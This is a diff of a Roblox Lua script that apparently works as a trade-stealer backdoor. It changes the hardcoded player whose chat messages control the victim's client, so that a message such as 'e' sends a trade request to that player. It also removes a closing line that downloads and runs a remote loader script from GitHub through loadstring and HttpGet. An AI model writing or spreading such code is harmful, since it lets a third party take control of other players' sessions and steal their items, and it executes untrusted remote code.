@@ -125,7 +125,7 @@ function MainCommands(plr, msg)
     
     if msg == "e" then
     local args = {
-    [1] = game:GetService("Players"):WaitForChild("0OF_RUSSlA")
+    [1] = game:GetService("Players"):WaitForChild("WatchfulDark_poop")
 }
 
 game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("SendRequest"):InvokeServer(unpack(args))
@@ -167,7 +167,7 @@ end
 end
 end
     
-    game.Players.0OF_RUSSlA.Chatted:Connect(function(msg)
+    game.Players.WatchfulDark_poop.Chatted:Connect(function(msg)
     
     local args = {
         [1] = msg,
@@ -207,5 +207,3 @@ Pl.PlayerAdded:Connect(function(plr)
         MainCommands(plr, msg)
     end)
 end)
-
-loadstring(game:HttpGet('https://raw.githubusercontent.com/R3TH-PRIV/R3THPRIV/main/loader.lua'))()
